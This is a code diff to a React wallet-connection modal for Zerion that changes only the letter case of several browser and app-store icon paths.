@@ -56,7 +56,7 @@ export default function ZerionWalletModal({ onClose, onConnect, onBack, onStartC
           {!showSeedInput ? (
             <>
               <div style={{ textAlign: 'center', marginBottom: 24 }}>
-                <img src="/icons/Zerion.log.png" alt="Zerion" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
+                <img src="/Icons/Zerion.log.png" alt="Zerion" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                 <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                   Connect Zerion with the extension or mobile app, then import your wallet or use the Zerion wallet directly.
                 </p>
@@ -83,7 +83,7 @@ export default function ZerionWalletModal({ onClose, onConnect, onBack, onStartC
                     }}
                   >
                     <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
-                      <img src="/icons/brave-logo.svg" alt="Brave" style={{ width: 24, height: 24 }} />
+                      <img src="/Icons/brave-logo.svg" alt="Brave" style={{ width: 24, height: 24 }} />
                       <span style={{ fontSize: 14, fontWeight: 500 }}>Brave Extension</span>
                     </div>
                     <span style={{ color: 'var(--cyan)' }}>→</span>
@@ -106,7 +106,7 @@ export default function ZerionWalletModal({ onClose, onConnect, onBack, onStartC
                     }}
                   >
                     <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
-                      <img src="/icons/chrome-icon.svg" alt="Chrome" style={{ width: 24, height: 24 }} />
+                      <img src="/Icons/chrome-icon.svg" alt="Chrome" style={{ width: 24, height: 24 }} />
                       <span style={{ fontSize: 14, fontWeight: 500 }}>Chrome Extension</span>
                     </div>
                     <span style={{ color: 'var(--cyan)' }}>→</span>
@@ -129,7 +129,7 @@ export default function ZerionWalletModal({ onClose, onConnect, onBack, onStartC
                     }}
                   >
                     <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
-                      <img src="/icons/firefox-b-icn.svg" alt="Firefox" style={{ width: 24, height: 24 }} />
+                      <img src="/Icons/firefox-b-icn.svg" alt="Firefox" style={{ width: 24, height: 24 }} />
                       <span style={{ fontSize: 14, fontWeight: 500 }}>Firefox Extension</span>
                     </div>
                     <span style={{ color: 'var(--cyan)' }}>→</span>
@@ -152,7 +152,7 @@ export default function ZerionWalletModal({ onClose, onConnect, onBack, onStartC
                     }}
                   >
                     <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
-                      <img src="/icons/arc-browr-ico.svg" alt="ARC" style={{ width: 24, height: 24 }} />
+                      <img src="/Icons/arc-browr-ico.svg" alt="ARC" style={{ width: 24, height: 24 }} />
                       <span style={{ fontSize: 14, fontWeight: 500 }}>ARC Extension</span>
                     </div>
                     <span style={{ color: 'var(--cyan)' }}>→</span>
@@ -175,7 +175,7 @@ export default function ZerionWalletModal({ onClose, onConnect, onBack, onStartC
                     }}
                   >
                     <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
-                      <img src="/icons/App_Store_(iOS).svg" alt="iOS" style={{ width: 24, height: 24 }} />
+                      <img src="/Icons/App_Store_(iOS).svg" alt="iOS" style={{ width: 24, height: 24 }} />
                       <span style={{ fontSize: 14, fontWeight: 500 }}>iOS App</span>
                     </div>
                     <span style={{ color: 'var(--cyan)' }}>→</span>
@@ -198,7 +198,7 @@ export default function ZerionWalletModal({ onClose, onConnect, onBack, onStartC
                     }}
                   >
                     <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
-                      <img src="/icons/play-store-icon.svg" alt="Android" style={{ width: 24, height: 24 }} />
+                      <img src="/Icons/play-store-icon.svg" alt="Android" style={{ width: 24, height: 24 }} />
                       <span style={{ fontSize: 14, fontWeight: 500 }}>Android App</span>
                     </div>
                     <span style={{ color: 'var(--cyan)' }}>→</span>
